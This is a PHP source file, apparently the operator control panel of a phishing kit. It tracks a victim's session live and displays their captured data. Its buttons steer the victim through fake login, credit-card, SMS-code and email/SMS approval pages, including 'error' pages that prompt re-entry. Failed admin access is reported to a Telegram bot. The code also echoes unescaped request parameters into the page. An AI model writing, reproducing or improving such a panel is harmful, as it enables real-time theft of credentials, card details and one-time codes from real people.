<?php
    error_reporting(0);
    session_start();
    include "../libraries/get-country-code.php";
    include "../setting/functions.php";
    include "../libraries/UserInfo.php";
    include "../setting/alert-admin.php";
    include "../setting/config.php";

    if(!isset($_GET['id_user']) OR empty($_GET['id_user'])){
        exit("INVALID REQUESTS. PLEASE ACCESS THIS PAGE FROM A VALID LINK");
    }

    $_SESSION['vip'] = $_GET['id_user'];
    $target = $_GET['id_user'];
    $file_name = $target;
    $jsonFilePath = "../panel/storage/{$file_name}.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);

    //xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx// 
    $jsonFilePath = "../panel/admin/admin.json";
    $json_data = file_get_contents($jsonFilePath);
    $user_data = json_decode($json_data, true);
    $login_status = $user_data['login_status'];
    $token_admin = TOKEN;
    $chat_id_admin = CHATID;
    $ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    $ip_found = false;
    foreach ($user_data['login_status'] ?? [] as $login) {
        if ($login['ip'] === $ip) {
            $ip_found = true;
            break;
        }
    }
    
    if (!$ip_found) {
        $_SESSION["message_login"] = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        $log = "Please log in to access this page. Or Your Ip Address is Change - " . $ip;

        // Send Data To Telegram :
        $message= urlencode("🔐========= Login Status =========🔐\r\n" . 
        "📍IP - ".get_client_ip()."\t\t | \t\t". 
        $detector->api() ."\r\n".
        "📊 Login Status = " .$log."\r\n".
        "💻 DEVICE = " .UserInfo::get_device()."\r\n".
        "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
        "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
        "DATE AND TIME = ". $present_time ."\r\n".
        "🔐========= Login Status =========🔐\r\n");
        telegram($token_admin, $message, $chat_id_admin);

        echo 
        "<script>
            window.location.replace('../panel/pages/login.php');
        </script>";
        exit;
    }
?> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/panel.css">
    <!-- Font Awesome Library -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- JQ -->
    <script src="../js/jquery-3.6.0.min.js"></script>    
    <!-- Favicon -->
    <link rel="icon" href="img/favicon.png">
    <link rel="shortcut" href="img/favicon.png">
    <link rel="appel-touch-icon" href="img/favicon.png">
    <title>Dashboard Control User - <?php echo $_GET['id_user'];?></title>
</head>
<body id="beforeUserData" class="">
    <!-- Start Nav Bar -->
    <nav>
        <div class="content-nav">
            <h3><img src="img/favicon.png" alt=""> Admin Dashboard</h3> 
            <div class="parent-buttons-setting" id="menu">
                <button id="updatePage" class="buttons-settings"> <i class="fa-solid fa-rotate-right"></i>Realod</button>
                <a class="buttons-settings" target="_blank" href="../panel/pages/settings.php"><i class="fa-solid fa-gear"></i>Settings</a>
                <a class="buttons-settings" target="_blank" href="../panel/pages/main_panel.php"><i class="fa-solid fa-square-poll-vertical"></i>Main Panel</a>
            </div>
            <button class="button-menu" id="buttonMenu"><i class="fa-solid fa-bars" id="buttonIcon"></i>Menu</button>
        </div>
    </nav>
    <!-- End Nav Bar -->

    <!-- Start Table User Information -->
        <div class="container parent-table" id="dashboard" >
        <h3 class="titles"><i class="fa-solid fa-chart-line" style="margin-right: 10px !important;"></i>User Information</h3>
        <table class="table">
            <thead>
                <tr>
                    <th><i class="fa-solid fa-signal"></i>Status</th>
                    <th><i class="fa-solid fa-map-pin"></i>Page</th>
                    <th><i class="fa-solid fa-wifi"></i>IP Address</th>
                    <th><i class="fa-solid fa-clock-rotate-left"></i>Time</th>
                </tr>
            </thead>
            <tbody id="tableBody" class="dynamic-section">

            </tbody>
        </table>
    </div>
    <!-- End Table User Information -->
     
    <!-- Start Buttons Control Users -->
    <div class="container-buttons-control-user">
        <div class="container">
            <h3 class="titles"><i class="fa-solid fa-gamepad" style="margin-right: 10px !important;"></i> Buttons Control User</h3>
            <form action="./check-action.php" method="get">
                <input type="hidden" name="step" value="panel">
                <input type="hidden" name="id_vip" value="<?php echo $_GET['id_user'];?>">
                <button type="submit" name="to" class="buttons-control-users button-valid" value="login">Login</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="login-error">Error Login</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="information">Information</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="information-error">Error Information</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="credit-card">Credit Card</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="credit-card-error">Error Credit Card</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="sms">SMS Code</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="sms-error">Error SMS Code</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="approvation-email">Email Approval</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="approvation-email-error">Error Email Approval</button>
                <button type="submit" name="to" class="buttons-control-users button-valid" value="approvation-sms">SMS Approval</button>
                <button type="submit" name="to" class="buttons-control-users button-error" value="approvation-sms-error">Error SMS Approval</button>
                <button type="submit" name="to" class="buttons-control-users button-comfirmed" value="confirmed">Confirmed Page</button>
                <button type="submit" name="to" class="buttons-control-users button-logout" value="logout">Logout</button>
                <button type="submit" name="ban" class="buttons-control-users button-error" value="<?php echo $_GET['id_user'];?>">Ban IP</button>
            </form>
            <div class="parent-buttons-events">
                <h3 class="titles"><i class="fa-solid fa-circle-info" style="margin-right: 10px !important;"></i>User Data</h3>
                <textarea class="data" id="userDataTextarea"></textarea>
            </div>
        </div>
    </div>
    <!-- Start User Data -->

    <!-- Script Js -->
    <script>
        function fetchAndUpdateContent(){$("#tableBody");$.ajax({url:"../panel/storage/<?php echo $file_name?>.json",type:"GET",dataType:"json",success:function(t){updateTable(t)},error:function(t,e,a){console.error("Error fetching data:",a)}}),setTimeout(fetchAndUpdateContent,1e3)}function updateTable(t){let e=$("#tableBody");e.empty();let a=$("<tr>"),n=$("<td>").html(t.userStatus),d=$("<td>").text(t.current_page),p=$("<td>").text(t.user_ip),o=$("<td>").text(t.timestamp);a.append(n,d,p,o),e.append(a)}fetchAndUpdateContent();const updatePage=$("#updatePage");updatePage.click(function(){location.reload()});
        $(document).ready(function(){setInterval(function a(){$.ajax({url:"get_user_data.php",type:"GET",data:{id_user:"<?php echo $_GET['id_user']; ?>"},success:function(a){try{let r=JSON.parse(a);if(r.error)$("#userDataTextarea").val(r.error);else{let e=(r.data_1||"")+(r.data_2||"")+(r.data_3||"")+(r.data_4||"")+(r.data_5||"")+(r.data_6||"")+(r.data_7||"")+(r.data_8||"")+(r.data_9||"")+(r.data_10||"")+(r.data_11||"")+(r.data_12||"")+(r.data_13||"");$("#userDataTextarea").val(e)}}catch(t){$("#userDataTextarea").val("Error parsing data")}},error:function(){$("#userDataTextarea").val("Error fetching data")}})},1e3)});
        const menu=document.getElementById("menu"),buttonMenu=document.getElementById("buttonMenu"),buttonIcon=document.getElementById("buttonIcon");buttonMenu.addEventListener("click",()=>{menu.classList.toggle("show-menu"),!0===menu.classList.contains("show-menu")?buttonIcon.className="fa-solid fa-circle-xmark":buttonIcon.className="fa-solid fa-bars"});
    </script>

</body>
</html>